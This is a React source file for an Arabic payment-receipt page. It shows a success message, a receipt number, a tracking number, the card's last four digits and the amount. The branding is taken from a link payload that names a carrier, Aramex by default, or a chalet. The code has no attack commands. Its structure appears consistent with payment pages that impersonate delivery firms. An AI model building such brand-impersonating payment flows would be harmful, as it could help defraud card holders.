import { useParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { CheckCircle2, Download, Home, Share2 } from "lucide-react";

const PaymentReceipt = () => {
  const { paymentId } = useParams();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  
  // Get service branding
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  // Define comprehensive colors object with fallbacks
  const colors = {
    primary: branding.colors?.primary || "#CE1126",
    secondary: branding.colors?.secondary || "#00732F",
    accent: branding.colors?.accent || "#000000",
    background: branding.colors?.background || "#FFFFFF",
    surface: branding.colors?.surface || "#F5F5F5",
    border: branding.colors?.border || "#E0E0E0",
    text: branding.colors?.text || "#000000",
    textLight: branding.colors?.textLight || "#666666",
    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
  };
  
  if (!payment || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  const countryData = getCountryByCode(link.country_code);
  if (!countryData) return null;
  
  const payload = link.payload;
  
  return (
    <div 
      className="min-h-screen py-12" 
      dir="rtl"
      style={{
        backgroundColor: colors.surface,
        backgroundImage: `linear-gradient(to bottom, ${colors.surface}, ${colors.primary}05)`
      }}
    >
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          {/* Success Animation */}
          <div className="text-center mb-8">
            <div 
              className="w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-4 animate-scale-in shadow-elevated"
              style={{
                background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
              }}
            >
              <CheckCircle2 className="w-12 h-12 text-white" />
            </div>
            <h1 className="text-4xl font-bold mb-2" style={{ color: colors.text }}>تم الدفع بنجاح!</h1>
            <p className="text-lg" style={{ color: colors.textLight }}>
              شكراً لك، تم تأكيد عملية الدفع
            </p>
          </div>
          
          <Card 
            className="p-8 shadow-elevated border-2" 
            style={{ 
              borderColor: `${colors.primary}20`,
              backgroundColor: colors.background
            }}
          >
            {/* Receipt Header */}
            <div className="text-center pb-6 border-b mb-6" style={{ borderColor: colors.border }}>
              <Badge 
                className="text-sm px-4 py-2 mb-3 border-0"
                style={{
                  background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
                  color: colors.textOnPrimary
                }}
              >
                <CheckCircle2 className="w-4 h-4 ml-2" />
                <span>مدفوع</span>
              </Badge>
              
              <p className="text-sm" style={{ color: colors.textLight }}>رقم الإيصال</p>
              <p className="text-2xl font-bold" style={{ color: colors.text }}>
                GF-{payment.id.substring(0, 8).toUpperCase()}
              </p>
            </div>
            
            {/* Details */}
            <div className="space-y-4 mb-6">
              <div className="flex justify-between py-3 border-b" style={{ borderColor: colors.border }}>
                <span style={{ color: colors.textLight }}>الخدمة</span>
                <span className="font-semibold" style={{ color: colors.text }}>
                  {payload.service_name || payload.chalet_name || serviceName}
                </span>
              </div>
              
              {payload.tracking_number && (
                <div className="flex justify-between py-3 border-b" style={{ borderColor: colors.border }}>
                  <span style={{ color: colors.textLight }}>رقم الشحنة</span>
                  <span className="font-semibold" style={{ color: colors.text }}>
                    {payload.tracking_number}
                  </span>
                </div>
              )}
              
              <div className="flex justify-between py-3 border-b" style={{ borderColor: colors.border }}>
                <span style={{ color: colors.textLight }}>طريقة الدفع</span>
                <span className="font-semibold" style={{ color: colors.text }}>
                  بطاقة •••• {payment.last_four}
                </span>
              </div>
              
              <div className="flex justify-between py-3 border-b" style={{ borderColor: colors.border }}>
                <span style={{ color: colors.textLight }}>التاريخ</span>
                <span className="font-semibold" dir="ltr" style={{ color: colors.text }}>
                  {new Date(payment.created_at).toLocaleDateString("ar-SA")}
                </span>
              </div>
              
              <div 
                className="flex justify-between py-4 rounded-lg px-4"
                style={{
                  backgroundColor: `${colors.primary}10`
                }}
              >
                <span className="text-lg font-bold" style={{ color: colors.text }}>المبلغ المدفوع</span>
                <span className="text-2xl font-bold" style={{ color: colors.primary }}>
                  {formatCurrency(payment.amount, payment.currency)}
                </span>
              </div>
            </div>
            
            {/* Actions */}
            <div className="flex flex-col sm:flex-row gap-3">
              <Button 
                size="lg" 
                className="flex-1 bg-white hover:bg-gray-50 border-2" 
                variant="outline"
                style={{
                  borderColor: colors.border,
                  color: colors.text
                }}
              >
                <Download className="w-5 h-5 ml-2" />
                <span>تحميل الإيصال</span>
              </Button>
              
              <Button 
                size="lg" 
                className="flex-1 bg-white hover:bg-gray-50 border-2" 
                variant="outline"
                style={{
                  borderColor: colors.border,
                  color: colors.text
                }}
              >
                <Share2 className="w-5 h-5 ml-2" />
                <span>مشاركة</span>
              </Button>
            </div>
            
            <Button
              size="lg"
              className="w-full mt-4 text-white"
              onClick={() => (window.location.href = "/")}
              style={{
                background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
              }}
            >
              <Home className="w-5 h-5 ml-2" />
              <span>العودة للرئيسية</span>
            </Button>
            
            <p className="text-xs text-center mt-6" style={{ color: colors.textLight }}>
              سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
            </p>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PaymentReceipt;
